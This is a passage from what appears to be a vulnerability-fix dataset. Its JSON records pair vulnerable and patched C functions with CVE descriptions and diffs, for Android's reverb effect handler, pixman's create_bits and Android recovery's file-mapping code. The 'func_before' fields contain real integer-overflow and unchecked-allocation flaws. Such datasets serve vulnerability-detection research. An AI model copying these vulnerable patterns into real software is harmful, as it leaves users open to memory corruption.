        "commit_text": " Add checks on parameter size field in effect command handlers to avoid overflow leading to invalid comparison with min allowed size for command and reply buffers.  Bug: 26347509. (cherry picked from commit ad1bd92a49d78df6bc6e75bee68c517c1326f3cf) ",
        "func_before": "int Reverb_command(effect_handle_t  self,\n                              uint32_t            cmdCode,\n                              uint32_t            cmdSize,\n                              void                *pCmdData,\n                              uint32_t            *replySize,\n                              void                *pReplyData){\n    android::ReverbContext * pContext = (android::ReverbContext *) self;\n    int retsize;\n    LVREV_ControlParams_st    ActiveParams;              /* Current control Parameters */\n    LVREV_ReturnStatus_en     LvmStatus=LVREV_SUCCESS;     /* Function call status */\n\n\n    if (pContext == NULL){\n        ALOGV(\"\\tLVM_ERROR : Reverb_command ERROR pContext == NULL\");\n        return -EINVAL;\n    }\n\n    //ALOGV(\"\\tReverb_command INPUTS are: command %d cmdSize %d\",cmdCode, cmdSize);\n\n    switch (cmdCode){\n        case EFFECT_CMD_INIT:\n            //ALOGV(\"\\tReverb_command cmdCode Case: \"\n            //        \"EFFECT_CMD_INIT start\");\n\n            if (pReplyData == NULL || replySize == NULL || *replySize != sizeof(int)){\n                ALOGV(\"\\tLVM_ERROR : Reverb_command cmdCode Case: \"\n                        \"EFFECT_CMD_INIT: ERROR\");\n                return -EINVAL;\n            }\n            *(int *) pReplyData = 0;\n            break;\n\n        case EFFECT_CMD_SET_CONFIG:\n            //ALOGV(\"\\tReverb_command cmdCode Case: \"\n            //        \"EFFECT_CMD_SET_CONFIG start\");\n            if (pCmdData == NULL || cmdSize != sizeof(effect_config_t) ||\n                    pReplyData == NULL || replySize == NULL || *replySize != sizeof(int)) {\n                ALOGV(\"\\tLVM_ERROR : Reverb_command cmdCode Case: \"\n                        \"EFFECT_CMD_SET_CONFIG: ERROR\");\n                return -EINVAL;\n            }\n            *(int *) pReplyData = android::Reverb_setConfig(pContext,\n                                                            (effect_config_t *) pCmdData);\n            break;\n\n        case EFFECT_CMD_GET_CONFIG:\n            if (pReplyData == NULL || replySize == NULL || *replySize != sizeof(effect_config_t)) {\n                ALOGV(\"\\tLVM_ERROR : Reverb_command cmdCode Case: \"\n                        \"EFFECT_CMD_GET_CONFIG: ERROR\");\n                return -EINVAL;\n            }\n\n            android::Reverb_getConfig(pContext, (effect_config_t *)pReplyData);\n            break;\n\n        case EFFECT_CMD_RESET:\n            //ALOGV(\"\\tReverb_command cmdCode Case: \"\n            //        \"EFFECT_CMD_RESET start\");\n            Reverb_setConfig(pContext, &pContext->config);\n            break;\n\n        case EFFECT_CMD_GET_PARAM:{\n            //ALOGV(\"\\tReverb_command cmdCode Case: \"\n            //        \"EFFECT_CMD_GET_PARAM start\");\n            effect_param_t *p = (effect_param_t *)pCmdData;\n\n            if (pCmdData == NULL || cmdSize < sizeof(effect_param_t) ||\n                    cmdSize < (sizeof(effect_param_t) + p->psize) ||\n                    pReplyData == NULL || replySize == NULL ||\n                    *replySize < (sizeof(effect_param_t) + p->psize)) {\n                ALOGV(\"\\tLVM_ERROR : Reverb_command cmdCode Case: \"\n                        \"EFFECT_CMD_GET_PARAM: ERROR\");\n                return -EINVAL;\n            }\n\n            memcpy(pReplyData, pCmdData, sizeof(effect_param_t) + p->psize);\n\n            p = (effect_param_t *)pReplyData;\n\n            int voffset = ((p->psize - 1) / sizeof(int32_t) + 1) * sizeof(int32_t);\n\n            p->status = android::Reverb_getParameter(pContext,\n                                                         (void *)p->data,\n                                                         (size_t  *)&p->vsize,\n                                                          p->data + voffset);\n\n            *replySize = sizeof(effect_param_t) + voffset + p->vsize;\n\n            //ALOGV(\"\\tReverb_command EFFECT_CMD_GET_PARAM \"\n            //        \"*pCmdData %d, *replySize %d, *pReplyData %d \",\n            //        *(int32_t *)((char *)pCmdData + sizeof(effect_param_t)),\n            //        *replySize,\n            //        *(int16_t *)((char *)pReplyData + sizeof(effect_param_t) + voffset));\n\n        } break;\n        case EFFECT_CMD_SET_PARAM:{\n\n            //ALOGV(\"\\tReverb_command cmdCode Case: \"\n            //        \"EFFECT_CMD_SET_PARAM start\");\n            //ALOGV(\"\\tReverb_command EFFECT_CMD_SET_PARAM param %d, *replySize %d, value %d \",\n            //        *(int32_t *)((char *)pCmdData + sizeof(effect_param_t)),\n            //        *replySize,\n            //        *(int16_t *)((char *)pCmdData + sizeof(effect_param_t) + sizeof(int32_t)));\n\n            if (pCmdData == NULL || (cmdSize < (sizeof(effect_param_t) + sizeof(int32_t))) ||\n                    pReplyData == NULL ||  replySize == NULL || *replySize != sizeof(int32_t)) {\n                ALOGV(\"\\tLVM_ERROR : Reverb_command cmdCode Case: \"\n                        \"EFFECT_CMD_SET_PARAM: ERROR\");\n                return -EINVAL;\n            }\n\n            effect_param_t *p = (effect_param_t *) pCmdData;\n\n            if (p->psize != sizeof(int32_t)){\n                ALOGV(\"\\t4LVM_ERROR : Reverb_command cmdCode Case: \"\n                        \"EFFECT_CMD_SET_PARAM: ERROR, psize is not sizeof(int32_t)\");\n                return -EINVAL;\n            }\n\n            //ALOGV(\"\\tn5Reverb_command cmdSize is %d\\n\"\n            //        \"\\tsizeof(effect_param_t) is  %d\\n\"\n            //        \"\\tp->psize is %d\\n\"\n            //        \"\\tp->vsize is %d\"\n            //        \"\\n\",\n            //        cmdSize, sizeof(effect_param_t), p->psize, p->vsize );\n\n            *(int *)pReplyData = android::Reverb_setParameter(pContext,\n                                                             (void *)p->data,\n                                                              p->data + p->psize);\n        } break;\n\n        case EFFECT_CMD_ENABLE:\n            //ALOGV(\"\\tReverb_command cmdCode Case: \"\n            //        \"EFFECT_CMD_ENABLE start\");\n\n            if (pReplyData == NULL || *replySize != sizeof(int)){\n                ALOGV(\"\\tLVM_ERROR : Reverb_command cmdCode Case: \"\n                        \"EFFECT_CMD_ENABLE: ERROR\");\n                return -EINVAL;\n            }\n            if(pContext->bEnabled == LVM_TRUE){\n                 ALOGV(\"\\tLVM_ERROR : Reverb_command cmdCode Case: \"\n                         \"EFFECT_CMD_ENABLE: ERROR-Effect is already enabled\");\n                 return -EINVAL;\n             }\n            *(int *)pReplyData = 0;\n            pContext->bEnabled = LVM_TRUE;\n            /* Get the current settings */\n            LvmStatus = LVREV_GetControlParameters(pContext->hInstance, &ActiveParams);\n            LVM_ERROR_CHECK(LvmStatus, \"LVREV_GetControlParameters\", \"EFFECT_CMD_ENABLE\")\n            pContext->SamplesToExitCount =\n                    (ActiveParams.T60 * pContext->config.inputCfg.samplingRate)/1000;\n            // force no volume ramp for first buffer processed after enabling the effect\n            pContext->volumeMode = android::REVERB_VOLUME_FLAT;\n            //ALOGV(\"\\tEFFECT_CMD_ENABLE SamplesToExitCount = %d\", pContext->SamplesToExitCount);\n            break;\n        case EFFECT_CMD_DISABLE:\n            //ALOGV(\"\\tReverb_command cmdCode Case: \"\n            //        \"EFFECT_CMD_DISABLE start\");\n\n            if (pReplyData == NULL || *replySize != sizeof(int)){\n                ALOGV(\"\\tLVM_ERROR : Reverb_command cmdCode Case: \"\n                        \"EFFECT_CMD_DISABLE: ERROR\");\n                return -EINVAL;\n            }\n            if(pContext->bEnabled == LVM_FALSE){\n                 ALOGV(\"\\tLVM_ERROR : Reverb_command cmdCode Case: \"\n                         \"EFFECT_CMD_DISABLE: ERROR-Effect is not yet enabled\");\n                 return -EINVAL;\n             }\n            *(int *)pReplyData = 0;\n            pContext->bEnabled = LVM_FALSE;\n            break;\n\n        case EFFECT_CMD_SET_VOLUME:\n            if (pCmdData == NULL ||\n                cmdSize != 2 * sizeof(uint32_t)) {\n                ALOGV(\"\\tLVM_ERROR : Reverb_command cmdCode Case: \"\n                        \"EFFECT_CMD_SET_VOLUME: ERROR\");\n                return -EINVAL;\n            }\n\n\n            if (pReplyData != NULL) { // we have volume control\n                pContext->leftVolume = (LVM_INT16)((*(uint32_t *)pCmdData + (1 << 11)) >> 12);\n                pContext->rightVolume = (LVM_INT16)((*((uint32_t *)pCmdData + 1) + (1 << 11)) >> 12);\n                *(uint32_t *)pReplyData = (1 << 24);\n                *((uint32_t *)pReplyData + 1) = (1 << 24);\n                if (pContext->volumeMode == android::REVERB_VOLUME_OFF) {\n                    // force no volume ramp for first buffer processed after getting volume control\n                    pContext->volumeMode = android::REVERB_VOLUME_FLAT;\n                }\n            } else { // we don't have volume control\n                pContext->leftVolume = REVERB_UNIT_VOLUME;\n                pContext->rightVolume = REVERB_UNIT_VOLUME;\n                pContext->volumeMode = android::REVERB_VOLUME_OFF;\n            }\n            ALOGV(\"EFFECT_CMD_SET_VOLUME left %d, right %d mode %d\",\n                    pContext->leftVolume, pContext->rightVolume,  pContext->volumeMode);\n            break;\n\n        case EFFECT_CMD_SET_DEVICE:\n        case EFFECT_CMD_SET_AUDIO_MODE:\n        //ALOGV(\"\\tReverb_command cmdCode Case: \"\n        //        \"EFFECT_CMD_SET_DEVICE/EFFECT_CMD_SET_VOLUME/EFFECT_CMD_SET_AUDIO_MODE start\");\n            break;\n\n        default:\n            ALOGV(\"\\tLVM_ERROR : Reverb_command cmdCode Case: \"\n                    \"DEFAULT start %d ERROR\",cmdCode);\n            return -EINVAL;\n    }\n\n    //ALOGV(\"\\tReverb_command end\\n\\n\");\n    return 0;\n}",
        "func": "int Reverb_command(effect_handle_t  self,\n                              uint32_t            cmdCode,\n                              uint32_t            cmdSize,\n                              void                *pCmdData,\n                              uint32_t            *replySize,\n                              void                *pReplyData){\n    android::ReverbContext * pContext = (android::ReverbContext *) self;\n    int retsize;\n    LVREV_ControlParams_st    ActiveParams;              /* Current control Parameters */\n    LVREV_ReturnStatus_en     LvmStatus=LVREV_SUCCESS;     /* Function call status */\n\n\n    if (pContext == NULL){\n        ALOGV(\"\\tLVM_ERROR : Reverb_command ERROR pContext == NULL\");\n        return -EINVAL;\n    }\n\n    //ALOGV(\"\\tReverb_command INPUTS are: command %d cmdSize %d\",cmdCode, cmdSize);\n\n    switch (cmdCode){\n        case EFFECT_CMD_INIT:\n            //ALOGV(\"\\tReverb_command cmdCode Case: \"\n            //        \"EFFECT_CMD_INIT start\");\n\n            if (pReplyData == NULL || replySize == NULL || *replySize != sizeof(int)){\n                ALOGV(\"\\tLVM_ERROR : Reverb_command cmdCode Case: \"\n                        \"EFFECT_CMD_INIT: ERROR\");\n                return -EINVAL;\n            }\n            *(int *) pReplyData = 0;\n            break;\n\n        case EFFECT_CMD_SET_CONFIG:\n            //ALOGV(\"\\tReverb_command cmdCode Case: \"\n            //        \"EFFECT_CMD_SET_CONFIG start\");\n            if (pCmdData == NULL || cmdSize != sizeof(effect_config_t) ||\n                    pReplyData == NULL || replySize == NULL || *replySize != sizeof(int)) {\n                ALOGV(\"\\tLVM_ERROR : Reverb_command cmdCode Case: \"\n                        \"EFFECT_CMD_SET_CONFIG: ERROR\");\n                return -EINVAL;\n            }\n            *(int *) pReplyData = android::Reverb_setConfig(pContext,\n                                                            (effect_config_t *) pCmdData);\n            break;\n\n        case EFFECT_CMD_GET_CONFIG:\n            if (pReplyData == NULL || replySize == NULL || *replySize != sizeof(effect_config_t)) {\n                ALOGV(\"\\tLVM_ERROR : Reverb_command cmdCode Case: \"\n                        \"EFFECT_CMD_GET_CONFIG: ERROR\");\n                return -EINVAL;\n            }\n\n            android::Reverb_getConfig(pContext, (effect_config_t *)pReplyData);\n            break;\n\n        case EFFECT_CMD_RESET:\n            //ALOGV(\"\\tReverb_command cmdCode Case: \"\n            //        \"EFFECT_CMD_RESET start\");\n            Reverb_setConfig(pContext, &pContext->config);\n            break;\n\n        case EFFECT_CMD_GET_PARAM:{\n            //ALOGV(\"\\tReverb_command cmdCode Case: \"\n            //        \"EFFECT_CMD_GET_PARAM start\");\n            effect_param_t *p = (effect_param_t *)pCmdData;\n            if (SIZE_MAX - sizeof(effect_param_t) < (size_t)p->psize) {\n                android_errorWriteLog(0x534e4554, \"26347509\");\n                return -EINVAL;\n            }\n            if (pCmdData == NULL || cmdSize < sizeof(effect_param_t) ||\n                    cmdSize < (sizeof(effect_param_t) + p->psize) ||\n                    pReplyData == NULL || replySize == NULL ||\n                    *replySize < (sizeof(effect_param_t) + p->psize)) {\n                ALOGV(\"\\tLVM_ERROR : Reverb_command cmdCode Case: \"\n                        \"EFFECT_CMD_GET_PARAM: ERROR\");\n                return -EINVAL;\n            }\n\n            memcpy(pReplyData, pCmdData, sizeof(effect_param_t) + p->psize);\n\n            p = (effect_param_t *)pReplyData;\n\n            int voffset = ((p->psize - 1) / sizeof(int32_t) + 1) * sizeof(int32_t);\n\n            p->status = android::Reverb_getParameter(pContext,\n                                                         (void *)p->data,\n                                                         (size_t  *)&p->vsize,\n                                                          p->data + voffset);\n\n            *replySize = sizeof(effect_param_t) + voffset + p->vsize;\n\n            //ALOGV(\"\\tReverb_command EFFECT_CMD_GET_PARAM \"\n            //        \"*pCmdData %d, *replySize %d, *pReplyData %d \",\n            //        *(int32_t *)((char *)pCmdData + sizeof(effect_param_t)),\n            //        *replySize,\n            //        *(int16_t *)((char *)pReplyData + sizeof(effect_param_t) + voffset));\n\n        } break;\n        case EFFECT_CMD_SET_PARAM:{\n\n            //ALOGV(\"\\tReverb_command cmdCode Case: \"\n            //        \"EFFECT_CMD_SET_PARAM start\");\n            //ALOGV(\"\\tReverb_command EFFECT_CMD_SET_PARAM param %d, *replySize %d, value %d \",\n            //        *(int32_t *)((char *)pCmdData + sizeof(effect_param_t)),\n            //        *replySize,\n            //        *(int16_t *)((char *)pCmdData + sizeof(effect_param_t) + sizeof(int32_t)));\n\n            if (pCmdData == NULL || (cmdSize < (sizeof(effect_param_t) + sizeof(int32_t))) ||\n                    pReplyData == NULL ||  replySize == NULL || *replySize != sizeof(int32_t)) {\n                ALOGV(\"\\tLVM_ERROR : Reverb_command cmdCode Case: \"\n                        \"EFFECT_CMD_SET_PARAM: ERROR\");\n                return -EINVAL;\n            }\n\n            effect_param_t *p = (effect_param_t *) pCmdData;\n\n            if (p->psize != sizeof(int32_t)){\n                ALOGV(\"\\t4LVM_ERROR : Reverb_command cmdCode Case: \"\n                        \"EFFECT_CMD_SET_PARAM: ERROR, psize is not sizeof(int32_t)\");\n                return -EINVAL;\n            }\n\n            //ALOGV(\"\\tn5Reverb_command cmdSize is %d\\n\"\n            //        \"\\tsizeof(effect_param_t) is  %d\\n\"\n            //        \"\\tp->psize is %d\\n\"\n            //        \"\\tp->vsize is %d\"\n            //        \"\\n\",\n            //        cmdSize, sizeof(effect_param_t), p->psize, p->vsize );\n\n            *(int *)pReplyData = android::Reverb_setParameter(pContext,\n                                                             (void *)p->data,\n                                                              p->data + p->psize);\n        } break;\n\n        case EFFECT_CMD_ENABLE:\n            //ALOGV(\"\\tReverb_command cmdCode Case: \"\n            //        \"EFFECT_CMD_ENABLE start\");\n\n            if (pReplyData == NULL || *replySize != sizeof(int)){\n                ALOGV(\"\\tLVM_ERROR : Reverb_command cmdCode Case: \"\n                        \"EFFECT_CMD_ENABLE: ERROR\");\n                return -EINVAL;\n            }\n            if(pContext->bEnabled == LVM_TRUE){\n                 ALOGV(\"\\tLVM_ERROR : Reverb_command cmdCode Case: \"\n                         \"EFFECT_CMD_ENABLE: ERROR-Effect is already enabled\");\n                 return -EINVAL;\n             }\n            *(int *)pReplyData = 0;\n            pContext->bEnabled = LVM_TRUE;\n            /* Get the current settings */\n            LvmStatus = LVREV_GetControlParameters(pContext->hInstance, &ActiveParams);\n            LVM_ERROR_CHECK(LvmStatus, \"LVREV_GetControlParameters\", \"EFFECT_CMD_ENABLE\")\n            pContext->SamplesToExitCount =\n                    (ActiveParams.T60 * pContext->config.inputCfg.samplingRate)/1000;\n            // force no volume ramp for first buffer processed after enabling the effect\n            pContext->volumeMode = android::REVERB_VOLUME_FLAT;\n            //ALOGV(\"\\tEFFECT_CMD_ENABLE SamplesToExitCount = %d\", pContext->SamplesToExitCount);\n            break;\n        case EFFECT_CMD_DISABLE:\n            //ALOGV(\"\\tReverb_command cmdCode Case: \"\n            //        \"EFFECT_CMD_DISABLE start\");\n\n            if (pReplyData == NULL || *replySize != sizeof(int)){\n                ALOGV(\"\\tLVM_ERROR : Reverb_command cmdCode Case: \"\n                        \"EFFECT_CMD_DISABLE: ERROR\");\n                return -EINVAL;\n            }\n            if(pContext->bEnabled == LVM_FALSE){\n                 ALOGV(\"\\tLVM_ERROR : Reverb_command cmdCode Case: \"\n                         \"EFFECT_CMD_DISABLE: ERROR-Effect is not yet enabled\");\n                 return -EINVAL;\n             }\n            *(int *)pReplyData = 0;\n            pContext->bEnabled = LVM_FALSE;\n            break;\n\n        case EFFECT_CMD_SET_VOLUME:\n            if (pCmdData == NULL ||\n                cmdSize != 2 * sizeof(uint32_t)) {\n                ALOGV(\"\\tLVM_ERROR : Reverb_command cmdCode Case: \"\n                        \"EFFECT_CMD_SET_VOLUME: ERROR\");\n                return -EINVAL;\n            }\n\n\n            if (pReplyData != NULL) { // we have volume control\n                pContext->leftVolume = (LVM_INT16)((*(uint32_t *)pCmdData + (1 << 11)) >> 12);\n                pContext->rightVolume = (LVM_INT16)((*((uint32_t *)pCmdData + 1) + (1 << 11)) >> 12);\n                *(uint32_t *)pReplyData = (1 << 24);\n                *((uint32_t *)pReplyData + 1) = (1 << 24);\n                if (pContext->volumeMode == android::REVERB_VOLUME_OFF) {\n                    // force no volume ramp for first buffer processed after getting volume control\n                    pContext->volumeMode = android::REVERB_VOLUME_FLAT;\n                }\n            } else { // we don't have volume control\n                pContext->leftVolume = REVERB_UNIT_VOLUME;\n                pContext->rightVolume = REVERB_UNIT_VOLUME;\n                pContext->volumeMode = android::REVERB_VOLUME_OFF;\n            }\n            ALOGV(\"EFFECT_CMD_SET_VOLUME left %d, right %d mode %d\",\n                    pContext->leftVolume, pContext->rightVolume,  pContext->volumeMode);\n            break;\n\n        case EFFECT_CMD_SET_DEVICE:\n        case EFFECT_CMD_SET_AUDIO_MODE:\n        //ALOGV(\"\\tReverb_command cmdCode Case: \"\n        //        \"EFFECT_CMD_SET_DEVICE/EFFECT_CMD_SET_VOLUME/EFFECT_CMD_SET_AUDIO_MODE start\");\n            break;\n\n        default:\n            ALOGV(\"\\tLVM_ERROR : Reverb_command cmdCode Case: \"\n                    \"DEFAULT start %d ERROR\",cmdCode);\n            return -EINVAL;\n    }\n\n    //ALOGV(\"\\tReverb_command end\\n\\n\");\n    return 0;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -63,7 +63,10 @@\n             //ALOGV(\"\\tReverb_command cmdCode Case: \"\n             //        \"EFFECT_CMD_GET_PARAM start\");\n             effect_param_t *p = (effect_param_t *)pCmdData;\n-\n+            if (SIZE_MAX - sizeof(effect_param_t) < (size_t)p->psize) {\n+                android_errorWriteLog(0x534e4554, \"26347509\");\n+                return -EINVAL;\n+            }\n             if (pCmdData == NULL || cmdSize < sizeof(effect_param_t) ||\n                     cmdSize < (sizeof(effect_param_t) + p->psize) ||\n                     pReplyData == NULL || replySize == NULL ||",
        "diff_line_info": {
            "deleted_lines": [
                ""
            ],
            "added_lines": [
                "            if (SIZE_MAX - sizeof(effect_param_t) < (size_t)p->psize) {",
                "                android_errorWriteLog(0x534e4554, \"26347509\");",
                "                return -EINVAL;",
                "            }"
            ]
        }
    },
    {
        "cve_id": "CVE-2014-9766",
        "func_name": "pixman/create_bits",
        "description": "Integer overflow in the create_bits function in pixman-bits-image.c in Pixman before 0.32.6 allows remote attackers to cause a denial of service (application crash) or possibly execute arbitrary code via large height and stride values.",
        "git_url": "https://cgit.freedesktop.org/pixman/commit/?id=857e40f3d2bc2cfb714913e0cd7e6184cf69aca3",
        "commit_title": "In create_bits() both height and stride are ints, so the result is",
        "commit_text": "also an int, which will overflow if height or stride are big enough and size_t is bigger than int.  This patch simply casts height to size_t to prevent these overflows, which prevents the crash in:      https://bugzilla.redhat.com/show_bug.cgi?id=972647  It's not even close to fixing the full problem of supporting big images in pixman.  See also      https://bugs.freedesktop.org/show_bug.cgi?id=69014 ",
        "func_before": "static uint32_t *\ncreate_bits (pixman_format_code_t format,\n             int                  width,\n             int                  height,\n             int *\t\t  rowstride_bytes,\n\t     pixman_bool_t\t  clear)\n{\n    int stride;\n    size_t buf_size;\n    int bpp;\n\n    /* what follows is a long-winded way, avoiding any possibility of integer\n     * overflows, of saying:\n     * stride = ((width * bpp + 0x1f) >> 5) * sizeof (uint32_t);\n     */\n\n    bpp = PIXMAN_FORMAT_BPP (format);\n    if (_pixman_multiply_overflows_int (width, bpp))\n\treturn NULL;\n\n    stride = width * bpp;\n    if (_pixman_addition_overflows_int (stride, 0x1f))\n\treturn NULL;\n\n    stride += 0x1f;\n    stride >>= 5;\n\n    stride *= sizeof (uint32_t);\n\n    if (_pixman_multiply_overflows_size (height, stride))\n\treturn NULL;\n\n    buf_size = height * stride;\n\n    if (rowstride_bytes)\n\t*rowstride_bytes = stride;\n\n    if (clear)\n\treturn calloc (buf_size, 1);\n    else\n\treturn malloc (buf_size);\n}",
        "func": "static uint32_t *\ncreate_bits (pixman_format_code_t format,\n             int                  width,\n             int                  height,\n             int *\t\t  rowstride_bytes,\n\t     pixman_bool_t\t  clear)\n{\n    int stride;\n    size_t buf_size;\n    int bpp;\n\n    /* what follows is a long-winded way, avoiding any possibility of integer\n     * overflows, of saying:\n     * stride = ((width * bpp + 0x1f) >> 5) * sizeof (uint32_t);\n     */\n\n    bpp = PIXMAN_FORMAT_BPP (format);\n    if (_pixman_multiply_overflows_int (width, bpp))\n\treturn NULL;\n\n    stride = width * bpp;\n    if (_pixman_addition_overflows_int (stride, 0x1f))\n\treturn NULL;\n\n    stride += 0x1f;\n    stride >>= 5;\n\n    stride *= sizeof (uint32_t);\n\n    if (_pixman_multiply_overflows_size (height, stride))\n\treturn NULL;\n\n    buf_size = (size_t)height * stride;\n\n    if (rowstride_bytes)\n\t*rowstride_bytes = stride;\n\n    if (clear)\n\treturn calloc (buf_size, 1);\n    else\n\treturn malloc (buf_size);\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -30,7 +30,7 @@\n     if (_pixman_multiply_overflows_size (height, stride))\n \treturn NULL;\n \n-    buf_size = height * stride;\n+    buf_size = (size_t)height * stride;\n \n     if (rowstride_bytes)\n \t*rowstride_bytes = stride;",
        "diff_line_info": {
            "deleted_lines": [
                "    buf_size = height * stride;"
            ],
            "added_lines": [
                "    buf_size = (size_t)height * stride;"
            ]
        }
    },
    {
        "cve_id": "CVE-2016-0849",
        "func_name": "android/sysMapFile",
        "description": "Multiple integer overflows in minzip/SysUtil.c in the Recovery Procedure in Android 5.0.x before 5.0.2, 5.1.x before 5.1.1, and 6.x before 2016-04-01 allow attackers to gain privileges via a crafted application, as demonstrated by obtaining Signature or SignatureOrSystem access, aka internal bug 26960931.",
        "git_url": "https://android.googlesource.com/platform/bootable/recovery/+/28a566f7731b4cb76d2a9ba16d997ac5aeb07dad",
        "commit_title": "Fix integer overflows in recovery procedure.",
        "commit_text": " Bug: 26960931 (cherry picked from commit 4f2df162c6ab4a71ca86e4b38735b681729c353b) ",
        "func_before": "int sysMapFile(const char* fn, MemMapping* pMap)\n{\n    memset(pMap, 0, sizeof(*pMap));\n\n    if (fn && fn[0] == '@') {\n        // A map of blocks\n        FILE* mapf = fopen(fn+1, \"r\");\n        if (mapf == NULL) {\n            LOGV(\"Unable to open '%s': %s\\n\", fn+1, strerror(errno));\n            return -1;\n        }\n\n        if (sysMapBlockFile(mapf, pMap) != 0) {\n            LOGW(\"Map of '%s' failed\\n\", fn);\n            return -1;\n        }\n\n        fclose(mapf);\n    } else {\n        // This is a regular file.\n        int fd = open(fn, O_RDONLY, 0);\n        if (fd < 0) {\n            LOGE(\"Unable to open '%s': %s\\n\", fn, strerror(errno));\n            return -1;\n        }\n\n        if (sysMapFD(fd, pMap) != 0) {\n            LOGE(\"Map of '%s' failed\\n\", fn);\n            close(fd);\n            return -1;\n        }\n\n        close(fd);\n    }\n    return 0;\n}",
        "func": "int sysMapFile(const char* fn, MemMapping* pMap)\n{\n    memset(pMap, 0, sizeof(*pMap));\n\n    if (fn && fn[0] == '@') {\n        // A map of blocks\n        FILE* mapf = fopen(fn+1, \"r\");\n        if (mapf == NULL) {\n            LOGV(\"Unable to open '%s': %s\\n\", fn+1, strerror(errno));\n            return -1;\n        }\n\n        if (sysMapBlockFile(mapf, pMap) != 0) {\n            LOGW(\"Map of '%s' failed\\n\", fn);\n            fclose(mapf);\n            return -1;\n        }\n\n        fclose(mapf);\n    } else {\n        // This is a regular file.\n        int fd = open(fn, O_RDONLY, 0);\n        if (fd < 0) {\n            LOGE(\"Unable to open '%s': %s\\n\", fn, strerror(errno));\n            return -1;\n        }\n\n        if (sysMapFD(fd, pMap) != 0) {\n            LOGE(\"Map of '%s' failed\\n\", fn);\n            close(fd);\n            return -1;\n        }\n\n        close(fd);\n    }\n    return 0;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -12,6 +12,7 @@\n \n         if (sysMapBlockFile(mapf, pMap) != 0) {\n             LOGW(\"Map of '%s' failed\\n\", fn);\n+            fclose(mapf);\n             return -1;\n         }\n ",
        "diff_line_info": {
            "deleted_lines": [],
            "added_lines": [
                "            fclose(mapf);"
            ]
        }
    },
    {
        "cve_id": "CVE-2016-0849",
        "func_name": "android/sysMapFD",
        "description": "Multiple integer overflows in minzip/SysUtil.c in the Recovery Procedure in Android 5.0.x before 5.0.2, 5.1.x before 5.1.1, and 6.x before 2016-04-01 allow attackers to gain privileges via a crafted application, as demonstrated by obtaining Signature or SignatureOrSystem access, aka internal bug 26960931.",
        "git_url": "https://android.googlesource.com/platform/bootable/recovery/+/28a566f7731b4cb76d2a9ba16d997ac5aeb07dad",
        "commit_title": "Fix integer overflows in recovery procedure.",
        "commit_text": " Bug: 26960931 (cherry picked from commit 4f2df162c6ab4a71ca86e4b38735b681729c353b) ",
        "func_before": "static int sysMapFD(int fd, MemMapping* pMap)\n{\n    off_t start;\n    size_t length;\n    void* memPtr;\n\n    assert(pMap != NULL);\n\n    if (getFileStartAndLength(fd, &start, &length) < 0)\n        return -1;\n\n    memPtr = mmap(NULL, length, PROT_READ, MAP_PRIVATE, fd, start);\n    if (memPtr == MAP_FAILED) {\n        LOGW(\"mmap(%d, R, PRIVATE, %d, %d) failed: %s\\n\", (int) length,\n            fd, (int) start, strerror(errno));\n        return -1;\n    }\n\n    pMap->addr = memPtr;\n    pMap->length = length;\n    pMap->range_count = 1;\n    pMap->ranges = malloc(sizeof(MappedRange));\n    pMap->ranges[0].addr = memPtr;\n    pMap->ranges[0].length = length;\n\n    return 0;\n}",
        "func": "static int sysMapFD(int fd, MemMapping* pMap)\n{\n    off_t start;\n    size_t length;\n    void* memPtr;\n\n    assert(pMap != NULL);\n\n    if (getFileStartAndLength(fd, &start, &length) < 0)\n        return -1;\n\n    memPtr = mmap(NULL, length, PROT_READ, MAP_PRIVATE, fd, start);\n    if (memPtr == MAP_FAILED) {\n        LOGW(\"mmap(%d, R, PRIVATE, %d, %d) failed: %s\\n\", (int) length,\n            fd, (int) start, strerror(errno));\n        return -1;\n    }\n\n    pMap->addr = memPtr;\n    pMap->length = length;\n    pMap->range_count = 1;\n    pMap->ranges = malloc(sizeof(MappedRange));\n    if (pMap->ranges == NULL) {\n        LOGE(\"malloc failed: %s\\n\", strerror(errno));\n        munmap(memPtr, length);\n        return -1;\n    }\n    pMap->ranges[0].addr = memPtr;\n    pMap->ranges[0].length = length;\n\n    return 0;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -20,6 +20,11 @@\n     pMap->length = length;\n     pMap->range_count = 1;\n     pMap->ranges = malloc(sizeof(MappedRange));\n+    if (pMap->ranges == NULL) {\n+        LOGE(\"malloc failed: %s\\n\", strerror(errno));\n+        munmap(memPtr, length);\n+        return -1;\n+    }\n     pMap->ranges[0].addr = memPtr;\n     pMap->ranges[0].length = length;\n ",
        "diff_line_info": {
            "deleted_lines": [],
            "added_lines": [
                "    if (pMap->ranges == NULL) {",
                "        LOGE(\"malloc failed: %s\\n\", strerror(errno));",
                "        munmap(memPtr, length);",
                "        return -1;",
                "    }"
            ]
        }
    },
    {
        "cve_id": "CVE-2016-0849",
        "func_name": "android/sysMapBlockFile",
        "description": "Multiple integer overflows in minzip/SysUtil.c in the Recovery Procedure in Android 5.0.x before 5.0.2, 5.1.x before 5.1.1, and 6.x before 2016-04-01 allow attackers to gain privileges via a crafted application, as demonstrated by obtaining Signature or SignatureOrSystem access, aka internal bug 26960931.",
        "git_url": "https://android.googlesource.com/platform/bootable/recovery/+/28a566f7731b4cb76d2a9ba16d997ac5aeb07dad",
        "commit_title": "Fix integer overflows in recovery procedure.",
        "commit_text": " Bug: 26960931 (cherry picked from commit 4f2df162c6ab4a71ca86e4b38735b681729c353b) ",
        "func_before": "static int sysMapBlockFile(FILE* mapf, MemMapping* pMap)\n{\n    char block_dev[PATH_MAX+1];\n    size_t size;\n    unsigned int blksize;\n    unsigned int blocks;\n    unsigned int range_count;\n    unsigned int i;\n\n    if (fgets(block_dev, sizeof(block_dev), mapf) == NULL) {\n        LOGW(\"failed to read block device from header\\n\");\n        return -1;\n    }\n    for (i = 0; i < sizeof(block_dev); ++i) {\n        if (block_dev[i] == '\\n') {\n            block_dev[i] = 0;\n            break;\n        }\n    }\n\n    if (fscanf(mapf, \"%zu %u\\n%u\\n\", &size, &blksize, &range_count) != 3) {\n        LOGW(\"failed to parse block map header\\n\");\n        return -1;\n    }\n\n    blocks = ((size-1) / blksize) + 1;\n\n    pMap->range_count = range_count;\n    pMap->ranges = malloc(range_count * sizeof(MappedRange));\n    memset(pMap->ranges, 0, range_count * sizeof(MappedRange));\n\n    // Reserve enough contiguous address space for the whole file.\n    unsigned char* reserve;\n    reserve = mmap64(NULL, blocks * blksize, PROT_NONE, MAP_PRIVATE | MAP_ANON, -1, 